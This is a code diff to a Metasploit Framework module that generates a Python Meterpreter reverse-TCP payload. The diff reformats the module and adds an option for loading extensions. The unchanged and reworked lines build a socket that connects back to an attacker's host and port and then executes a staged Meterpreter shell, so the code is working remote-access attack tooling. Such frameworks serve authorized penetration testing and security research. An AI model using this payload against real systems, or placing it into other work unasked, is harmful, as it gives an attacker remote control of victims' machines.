@@ -3,15 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/handler/reverse_tcp'
-require 'msf/core/payload/python'
-require 'msf/core/payload/python/meterpreter_loader'
-require 'msf/core/payload/python/reverse_tcp'
-require 'msf/base/sessions/meterpreter_python'
-
 module MetasploitModule
-
-  CachedSize = 112245
+  CachedSize = :dynamic
 
   include Msf::Payload::Single
   include Msf::Payload::Python
@@ -19,23 +12,31 @@ module MetasploitModule
   include Msf::Payload::Python::MeterpreterLoader
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'        => 'Python Meterpreter Shell, Reverse TCP Inline',
-      'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',
-      'Author'      => 'Spencer McIntyre',
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'python',
-      'Arch'        => ARCH_PYTHON,
-      'Handler'     => Msf::Handler::ReverseTcp,
-      'Session'     => Msf::Sessions::Meterpreter_Python_Python
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Python Meterpreter Shell, Reverse TCP Inline',
+        'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',
+        'Author' => 'Spencer McIntyre',
+        'License' => MSF_LICENSE,
+        'Platform' => 'python',
+        'Arch' => ARCH_PYTHON,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::Meterpreter_Python_Python
+      )
+    )
+
+    register_options([
+      OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load'])
+    ])
   end
 
-  def generate_reverse_tcp(opts={})
-    socket_setup  = "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+  def generate_reverse_tcp(opts = {})
+    socket_setup = "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
     socket_setup << "s.connect(('#{opts[:host]}',#{opts[:port]}))\n"
     opts[:stageless_tcp_socket_setup] = socket_setup
     opts[:stageless] = true
+    opts[:extensions] = (datastore['EXTENSIONS'] || '').split(',')
 
     met = stage_meterpreter(opts)
     py_create_exec_stub(met)
